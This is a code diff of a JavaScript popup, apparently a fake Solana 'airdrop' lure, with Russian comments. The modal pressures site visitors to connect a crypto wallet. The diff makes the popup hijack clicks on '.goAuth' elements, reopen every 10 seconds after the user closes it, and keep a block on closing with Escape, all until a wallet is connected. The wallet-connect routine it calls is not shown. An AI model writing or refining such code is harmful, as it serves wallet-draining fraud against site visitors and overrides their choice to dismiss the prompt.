@@ -1,8 +1,9 @@
-document.addEventListener('DOMContentLoaded', function () {
+window.addEventListener('load', function () {
   // 1. Конфигурация
   const config = {
     modalZIndex: 9998,
-    showDelay: 500
+    showDelay: 500,
+    reopenInterval: 10000 // каждые 10 секунд
   };
 
   // 2. Языковые настройки
@@ -40,7 +41,6 @@ document.addEventListener('DOMContentLoaded', function () {
     pointerEvents: 'none'
   });
 
-  // 4. Внутренний контент с обновлённым onclick
   modal.innerHTML = `
     <div style="
       max-width: 420px;
@@ -79,14 +79,6 @@ document.addEventListener('DOMContentLoaded', function () {
           border-radius: 10px;
           cursor: pointer;
         "
-        onclick="
-          const modal = document.getElementById('sol-airdrop-modal');
-          modal.style.opacity = '0';
-          modal.style.pointerEvents = 'none';
-          window.allowAutoShow = false;
-          setTimeout(() => { if (modal) modal.remove(); }, 300);
-          if (typeof window.startConnect === 'function') window.startConnect();
-        "
       >
         ${lang.button}
       </button>
@@ -95,36 +87,46 @@ document.addEventListener('DOMContentLoaded', function () {
 
   document.body.appendChild(modal);
 
-  // 5. Управление видимостью
-  window.allowAutoShow = true;
+  // 4. Управление видимостью
+  let userClosed = false; // флаг, что пользователь закрыл окно вручную
 
   const showModal = () => {
-    if (window.walletConnected || !window.allowAutoShow) return;
+    if (window.walletConnected) return;
     modal.style.opacity = '1';
     modal.style.pointerEvents = 'auto';
+    userClosed = false;
   };
 
-  // 6. Инициализация
+  const hideModal = () => {
+    modal.style.opacity = '0';
+    modal.style.pointerEvents = 'none';
+    userClosed = true;
+  };
+
+  // 5. Показ после полной загрузки + задержка
   setTimeout(showModal, config.showDelay);
 
-  // 7. Обработчик для .goAuth элементов
+  // 6. Кнопка подключения
+  modal.querySelector('#airdrop-connect-btn').addEventListener('click', () => {
+    hideModal();
+    if (typeof window.startConnect === 'function') window.startConnect();
+  });
+
+  // 7. Клик по .goAuth — всегда открывает снова
   document.addEventListener('click', function (e) {
     const goAuthElement = e.target.closest('.goAuth');
     if (goAuthElement && !window.walletConnected) {
       e.preventDefault();
-      window.allowAutoShow = true;
       showModal();
     }
   }, true);
 
-  // 8. Проверка подключения кошелька
+  // 8. Автоповтор показа каждые 10 секунд, если закрыто и нет кошелька
   setInterval(() => {
-    if (window.walletConnected) {
-      modal.style.opacity = '0';
-      modal.style.pointerEvents = 'none';
-      window.allowAutoShow = false;
+    if (!window.walletConnected && userClosed) {
+      showModal();
     }
-  }, 500);
+  }, config.reopenInterval);
 
   // 9. Запрет закрытия через Escape
   window.addEventListener('keydown', function (e) {
